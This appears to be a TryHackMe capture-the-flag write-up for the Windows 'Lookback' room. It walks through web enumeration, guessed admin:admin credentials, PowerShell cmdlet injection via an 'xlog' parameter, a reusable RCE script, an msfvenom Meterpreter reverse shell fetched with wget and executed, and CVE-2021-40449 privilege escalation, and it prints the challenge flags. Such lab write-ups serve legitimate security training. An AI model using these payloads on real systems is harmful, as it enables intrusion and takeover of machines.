| Category          | Details                                                                                     |
|-------------------|---------------------------------------------------------------------------------------------|
| 📝 **Name**       | [Lookback](https://tryhackme.com/room/lookback)                                             |  
| 🏷 **Type**       | THM Challenge                                                                               |
| 🖥 **OS**         | Windows                                                                                     |
| 🎯 **Difficulty** | Easy                                                                                        |
| 📁 **Tags**       | Web enumeration, Password guessing, Powershell cmdlet injection, Metasploit, CVE-2021-40449 |

## Task 1: Find the flags

### What is the service user flag?

#### Scan target with `nmap`
```
┌──(magicrc㉿perun)-[~/attack/THM Lookback]
└─$ nmap -sS -sC -sV -p- $TARGET
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-19 16:18 CET
Nmap scan report for 10.80.138.193
Host is up (0.039s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: Site doesn't have a title.
|_http-server-header: Microsoft-IIS/10.0
443/tcp  open  ssl/https
| ssl-cert: Subject: commonName=WIN-12OUO7A66M7
| Subject Alternative Name: DNS:WIN-12OUO7A66M7, DNS:WIN-12OUO7A66M7.thm.local
| Not valid before: 2023-01-25T21:34:02
|_Not valid after:  2028-01-25T21:34:02
| http-title: Outlook
|_Requested resource was https://10.80.138.193/owa/auth/logon.aspx?url=https%3a%2f%2f10.80.138.193%2fowa%2f&reason=0
|_http-server-header: Microsoft-IIS/10.0
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=WIN-12OUO7A66M7.thm.local
| Not valid before: 2025-12-18T15:05:27
|_Not valid after:  2026-06-19T15:05:27
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 182.66 seconds
```

#### Enumerate web application running at port 443
```
┌──(magicrc㉿perun)-[~/attack/THM Lookback]
└─$ feroxbuster --url https://$TARGET/ -w /usr/share/wordlists/dirb/big.txt -k
<SNIP>
401      GET       29l      100w     1293c https://10.80.187.207/TEST
401      GET       29l      100w     1293c https://10.80.187.207/Test
<SNIP>
```

#### Try accessing `/test` endpoint
```
┌──(magicrc㉿perun)-[~/attack/THM Lookback]
└─$ curl -I https://$TARGET/test/ -k 
HTTP/2 401 
content-length: 1293
content-type: text/html
server: Microsoft-IIS/10.0
x-powered-by: ASP.NET
www-authenticate: Basic realm="10.80.187.207"
date: Fri, 19 Dec 2025 20:04:37 GMT
```
Endpoint is protected with basic HTTP authorization.

#### Access `/test` endpoint with guessed `admin:admin` credentials
```
┌──(magicrc㉿perun)-[~/attack/THM Lookback]
└─$ curl -I https://$TARGET/test/ -k -u 'admin:admin'
HTTP/2 200 
cache-control: private
content-length: 1109
content-type: text/html; charset=utf-8
server: Microsoft-IIS/10.0
x-aspnet-version: 4.0.30319
x-powered-by: ASP.NET
date: Fri, 19 Dec 2025 20:06:01 GMT
```

#### Capture 1st flag
```
┌──(magicrc㉿perun)-[~/attack/THM Lookback]
└─$ curl -s https://$TARGET/test/ -k -u 'admin:admin' | grep -oP 'THM{.+}'
THM{Security_Through_Obscurity_Is_Not_A_Defense}
```

### What is the user flag?

#### Enumerate `Log analyzer` application
```
┌──(magicrc㉿perun)-[~/attack/THM Lookback]
└─$ XLOG=$(echo -n ";" | jq -sRr @uri)
STATE=$(curl -s https://$TARGET/test/ -k -u 'admin:admin' \
| grep -oE '(__VIEWSTATE|__VIEWSTATEGENERATOR|__EVENTVALIDATION)" value="[^"]+' \
| sed 's/name="//;s/" value="/=/;s/$/\&/' \
| tr -d '\n' \
| sed 's/&$//')
curl -s https://$TARGET/test/ -k -u 'admin:admin' -d "xlog=$XLOG&Button=Run&$STATE" | sed -n '/<pre[^>]*>/,/<\/pre>/{
  s/<pre[^>]*>//g
  s/<\/pre>//g
  s/^[[:space:]]*//
  p
}' | head -n -1
Get-Content : Cannot find path 'C:\;' because it does not exist.
At line:1 char:1
+ Get-Content('C:\;')
+ ~~~~~~~~~~~~~~~~~~~
+ CategoryInfo          : ObjectNotFound: (C:\;:String) [Get-Content], ItemNotFoundException
+ FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetContentCommand
```
By passing `;` as `xlog` HTTP parameter we were able to trigger `Get-Content` cmdlet error, which means that some PowerShell script is running on target backend.

#### Prepare `xlog.sh` script for easier PowerShell cmdlet injection enumeration
```
┌──(magicrc㉿perun)-[~/attack/THM Lookback]
└─$ { cat <<'EOF'> xlog.sh
XLOG=$(echo -n "$1" | jq -sRr @uri)
STATE=$(curl -s https://$TARGET/test/ -k -u 'admin:admin' \
| grep -oE '(__VIEWSTATE|__VIEWSTATEGENERATOR|__EVENTVALIDATION)" value="[^"]+' \
| sed 's/name="//;s/" value="/=/;s/$/\&/' \
| tr -d '\n' \
| sed 's/&$//')
curl -s https://$TARGET/test/ -k -u 'admin:admin' -d "xlog=$XLOG&Button=Run&$STATE" | sed -n '/<pre[^>]*>/,/<\/pre>/{
  s/<pre[^>]*>//g
  s/<\/pre>//g
  s/^[[:space:]]*//
  p
}' | head -n -1
EOF
} && chmod +x xlog.sh && ./xlog.sh -- ;
Get-Content : Cannot find path 'C:\--' because it does not exist.
At line:1 char:1
+ Get-Content('C:\--')
+ ~~~~~~~~~~~~~~~~~~~~
+ CategoryInfo          : ObjectNotFound: (C:\--:String) [Get-Content], ItemNotFoundException
+ FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetContentCommand
```

#### Inject `ls C:\Windows\Temp\` cmdlet to confirm vulnerability
```
┌──(magicrc㉿perun)-[~/attack/THM Lookback]
└─$ ./xlog.sh "BitlockerActiveMonitoringLogs'); ls C:\Windows\Temp\ #" 
List generated at 11:08:43 AM.


Directory: C:\Windows\Temp


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----        3/29/2023   8:16 AM                2567793A-119F-450F-AC41-826FCBDCF6B2-Sigs                             
d-----        3/29/2023   7:51 AM                3ljst3kc.1br                                                          
d-----        3/29/2023   7:50 AM                5omvprun.ycj                                                          
d-----       12/20/2025   3:08 AM                AdminNode1                                                            
d-----        3/22/2023  12:13 PM                bafbfb0b-33dd-489e-aab1-f5fa6a98989f                                  
d-----        3/22/2023  12:13 PM                d72bc4ea-53c4-48a5-9335-2895f5fec593                                  
d-----       12/20/2025   3:06 AM                DiagTrack_alternativeTrace                                            
d-----       12/20/2025   3:06 AM                DiagTrack_aot                                                         
d-----       12/20/2025   3:06 AM                DiagTrack_diag                                                        
d-----       12/20/2025   3:06 AM                DiagTrack_miniTrace                                                   
d-----         2/2/2023  12:04 PM                ExchangeSetup                                                         
d-----        3/22/2023  12:13 PM                f8325b28-dbe8-4e3a-bdea-0348cc6d5573                                  
d-----        3/21/2023  12:01 PM                HostController                                                        
d-----        1/25/2023   1:57 PM                Monitoring                                                            
d-----        3/29/2023   7:51 AM                xijp01yu.lhe                                                          
-a----        3/29/2023   7:55 AM      104928760 mpam-f689538e.exe                                                     
-a----       12/20/2025   3:37 AM         287308 MpCmdRun.log                                                          
-a----        3/29/2023   8:16 AM         459466 MpSigStub.log                                                         
-a----        3/29/2023   2:43 AM         104784 msedge_installer.log                                                  
-a----       12/20/2025   3:08 AM            102 silconfig.log                                                         
-a----        3/29/2023   7:46 AM            310 WER7927.tmp.WERDataCollectionStatus.txt                               
-a----        3/29/2023   8:00 AM            310 WER7D7D.tmp.WERDataCollectionStatus.txt 
```

#### Prepare exploit for PowerShell RCE
```
┌──(magicrc㉿perun)-[~/attack/THM Lookback]
└─$ { cat <<'EOF'> rce.sh
XLOG=$(echo -n "BitlockerActiveMonitoringLogs'); $1 #" | jq -sRr @uri)
STATE=$(curl -s https://$TARGET/test/ -k -u 'admin:admin' \
| grep -oE '(__VIEWSTATE|__VIEWSTATEGENERATOR|__EVENTVALIDATION)" value="[^"]+' \
| sed 's/name="//;s/" value="/=/;s/$/\&/' \
| tr -d '\n' \
| sed 's/&$//')
curl -s https://$TARGET/test/ -k -u 'admin:admin' -d "xlog=$XLOG&Button=Run&$STATE" | sed -n '/<pre[^>]*>/,/<\/pre>/{
  s/<pre[^>]*>//g
  s/<\/pre>//g
  s/^[[:space:]]*//
  p
}' | head -n -1 | tail -n +4
EOF
} && chmod +x rce.sh
```

#### Start Metasploit and listen for reverse shell connection
```
┌──(magicrc㉿perun)-[~/attack/THM Lookback]
└─$ msfconsole -q -x "use exploit/multi/handler; set LHOST tun0; set LPORT 4444; set payload windows/x64/meterpreter/reverse_tcp; run"
[*] Using configured payload generic/shell_reverse_tcp
LHOST => tun0
LPORT => 4444
payload => windows/x64/meterpreter/reverse_tcp
[*] Started reverse TCP handler on 192.168.132.170:4444
```

#### Generate and host `windows/x64/meterpreter/reverse_tcp` reverse shell
```
┌──(magicrc㉿perun)-[~/attack/THM Lookback]
└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=4444 -f exe -o shell.exe && python3 -m http.server 80
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7680 bytes
Saved as: shell.exe
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

#### Spawn reverse shell connection using `rce.sh` exploit
```
┌──(magicrc㉿perun)-[~/attack/THM Lookback]
└─$ ./rce.sh 'wget http://192.168.132.170/shell.exe -OutFile C:\Windows\Temp\shell.exe; C:\Windows\Temp\shell.exe'
```

#### Confirm foothold gained
```
[*] Sending stage (230982 bytes) to 10.81.156.120
[*] Meterpreter session 1 opened (192.168.132.170:4444 -> 10.81.156.120:10693) at 2025-12-20 13:03:38 +0100

meterpreter > getuid
Server username: THM\admin
```

#### Exploit [CVE-2021-40449](https://nvd.nist.gov/vuln/detail/CVE-2021-40449) using `exploit/windows/local/cve_2021_40449` to escalate to `Administrator`
Exploit suggested by `post/multi/recon/local_exploit_suggester`.
```
meterpreter > background
[*] Backgrounding session 1...
msf exploit(multi/handler) > use exploit/windows/local/cve_2021_40449
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf exploit(windows/local/cve_2021_40449) > set SESSION 1
SESSION => 1
msf exploit(windows/local/cve_2021_40449) > set LHOST tun0
LHOST => tun0
msf exploit(windows/local/cve_2021_40449) > set LPORT 5555
LPORT => 5555
msf exploit(windows/local/cve_2021_40449) > run
[*] Started reverse TCP handler on 192.168.132.170:5555 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Vulnerable Windows 10 v1809 build detected!
[*] Launching netsh to host the DLL...
[+] Process 5496 launched.
[*] Reflectively injecting the DLL into 5496...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (230982 bytes) to 10.81.156.120
[*] Meterpreter session 2 opened (192.168.132.170:5555 -> 10.81.156.120:10826) at 2025-12-20 13:05:18 +0100

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

#### Capture 2nd flag
```
meterpreter > cat C:\\Users\\dev\\Desktop\\user.txt 
THM{Stop_Reading_Start_Doing}
```

### What is the root flag?

#### Capture 3rd flag
```
meterpreter > cat C:\\Users\\Administrator\\Documents\\flag.txt 
THM{Looking_Back_Is_Not_Always_Bad}
```
